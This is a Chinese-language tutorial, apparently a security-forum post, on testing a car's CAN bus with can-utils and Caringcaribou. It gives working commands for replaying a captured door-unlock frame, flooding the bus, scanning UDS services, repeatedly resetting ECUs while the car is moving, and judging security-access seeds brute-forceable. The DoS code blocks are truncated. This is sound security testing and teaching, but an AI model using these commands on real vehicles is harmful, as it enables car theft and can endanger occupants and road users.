本演示希望起到一个梳理的作用，希望读者理解每一步的原理，多看标准，不要完全依赖工具。

常用CAN收发工具包括很多种，本篇以socket can搭配Caringcaribou为例展开介绍（socket can买免驱的，优点便宜、使用方便，Caringcaribou做can简直太好用，但也发现一个问题，缺少扩展帧的uds检测，二次开发中，把这个模块补上）

![图片](https://shs3.b.qianxin.com/attack_forum/2023/12/attach-e7990a9beec20f25dcda5fa1e5da642edb3489aa.png)

### **环境搭建：**

**1.canutils**

1.1 kali执行如下命令

apt install can-utils

1.2 执行`candump -h`回显如下证明安装成功

![图片](https://shs3.b.qianxin.com/attack_forum/2023/12/attach-5fcf4f1693c5a689d638e8f1c57cd2ad6e441571.png)

**2.Caringcaribou**

2.1 执行如下命令进行安装

下载Caringcaribou
===============

git clone <https://github.com/CaringCaribou/caringcaribou.git>

到文件目录执行安装程序
===========

cd caringcaribou  
python3 setup.py install

\# 安装 python can 库  
pip3 install python-can

### **演示**

### **重放攻击**

1.1 candump监听Can总线数据 （此处是破线接入车辆can网络）

`candump can0 -l`

1.2 按动车钥匙中的开锁按钮

![图片](https://shs3.b.qianxin.com/attack_forum/2023/12/attach-4632299cb7a2a57444ae64610d99189474606d3f.png)

1.3 停止抓包并对抓到的数据进行处理

`cat candump.log | awk '{print $3}' > res.txt`

1.4 利用Caringcaribou工具进行重放攻击

`cc.py fuzzer identify res.txt`

1.5 根据汽车是否出现对应反应选择y/n, 获取开关车门数据包

![图片](https://shs3.b.qianxin.com/attack_forum/2023/12/attach-4559c3c685666e2670cc89308bf5b514ebca075a.png)

1.6 对开关车门数据包进行重放

`cansend can0 100#3d157d40d9000560`

观察到车锁成功被开启

![图片](https://shs3.b.qianxin.com/attack_forum/2023/12/attach-4632299cb7a2a57444ae64610d99189474606d3f.png)

再重放一次数据包,发现车锁成功关闭

![图片](https://shs3.b.qianxin.com/attack_forum/2023/12/attach-4632299cb7a2a57444ae64610d99189474606d3f.png)

### **DoS攻击**

### **（1）过载Dos攻击**

此处使用CANoe实现过载DOS攻击

代码如下

```php
variables
```

**（2）优先级Dos攻击**

编写shell脚本向can总线发送10000条垃圾数据

`vim dos.sh`

写入如下内容

```php
#!/bin/bash
```

运行该shell脚本

chmod +x dos.sh  
./dos.sh

### **UDS探测**

通过OBD接口连接车辆Can总线,对Can总线进行抓包尝试

![图片](https://shs3.b.qianxin.com/attack_forum/2023/12/attach-46ab3e3fc950174e55983a39c412fda9dcc1388f.png)

`candump can0`

![图片](https://shs3.b.qianxin.com/attack_forum/2023/12/attach-7a44837f23a4107e2812bd44994c0d7655eed499.png)

未获取到数据,说明网关对Can总线和OBD接口进行了隔离,无法直接抓到Can报文

向Can总线发送UDS诊断请求,回显正常,说明Can总线工作正常

**方法一：**

**UDS服务扫描**` `

`cc.py uds discovery`

![图片](https://shs3.b.qianxin.com/attack_forum/2023/12/attach-eb9ea3b41ea31a30b27c928ce188d29532ffb307.png)

**探测支持的服务ID**

`cc.py uds services src ds`

`cc.py uds services 0x607 0x608`

进行服务探测,发现0x27,0x29服务均存在

![图片](https://shs3.b.qianxin.com/attack_forum/2023/12/attach-f35653400c27bc430ed5e07776877944c83fc65d.png)

尝试进行重置ECU,读取任意did等操作,发现并没有鉴权

`cc.py uds dump_dids 0x607 0x608`

![图片](https://shs3.b.qianxin.com/attack_forum/2023/12/attach-3fe6667934cb56d219928ef47929e184aaeb4645.png)

切换至扩展会话模式

`cansend can0 607#0210030000000000`

在车辆行驶的过程中向车辆发送

**发送重置ecu请求，** 多次发送可以发现Ecu无限制重置

`cc.py uds ecu_reset 2 clientid serverid`

![图片](https://shs3.b.qianxin.com/attack_forum/2023/12/attach-8a9e81d67f42778f5271565ac711d2e8152ea537.png)

**27服务安全性**

切换至编程模式

`cansend can0 607#0210020000000000`

多次请求安全种子，观察种子强度和重复

`cansend can0 607#0227010000000000`

**方法二：**

使用caringcaribou工具auto模块

自动化探测uds主要攻击面（但不适用扩展帧的uds检测，二次开发中）

```php
cc.py uds auto
```

**\*\*27服务安全性**  
\*\*

探测27服务种子强度和重复问题

```php
cc.py uds_fuzz seed_randomness_fuzzer 100311022701 0x733 0x633
```

种子重复且种子为8位，但前5位一致，有效位只为3位，可爆破种子，

![图片](https://shs3.b.qianxin.com/attack_forum/2023/12/attach-a3c11ef4398eba550f9922c738de530e667ca090.png)


**模糊测试**
--------

1.1 candump监听Can总线

`candump can0 -l`

1.2 使用Caringcaribou向Can总线发送随机消息

`cc.py fuzzer random`

![图片](https://shs3.b.qianxin.com/attack_forum/2023/12/attach-ba011cc69b469cecc95ca1e81712f2bb134c9421.png)

1.3 随时观察车辆是否发生异常现象,若发生,则停止candump监听,对数据进行处理

`cat candump.log | awk '{print $3}' > res.txt`

1.4 使用Caringcaribou进行重放以确认引起问题的数据包

`cc.py fuzzer identify res.txt`

![图片](https://shs3.b.qianxin.com/attack_forum/2023/12/attach-93b2b8058d6be774075bb3ee583b2581f73ed2ff.png)


产品预告

基于caringcaribou二次开发

适用扩展帧的uds检测

![图片](https://shs3.b.qianxin.com/attack_forum/2023/12/attach-c6720152e06e3c9daf7de06f27191d8e4786d8c1.png)